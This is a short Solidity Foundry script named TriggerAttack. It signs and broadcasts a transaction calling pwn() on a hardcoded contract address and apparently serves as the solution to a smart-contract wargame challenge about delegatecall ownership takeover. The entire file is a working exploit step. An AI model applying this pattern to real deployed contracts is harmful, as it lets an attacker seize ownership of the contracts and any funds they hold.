// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";

contract TriggerAttack is Script {
    address delegateContract = 0xe11429667b4815EdBC31A765C5B258D9cdD7d870;

    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(privateKey);

        (bool success, ) = delegateContract.call(
            abi.encodeWithSignature("pwn()")
        );
        require(success);

        vm.stopBroadcast();
    }
}
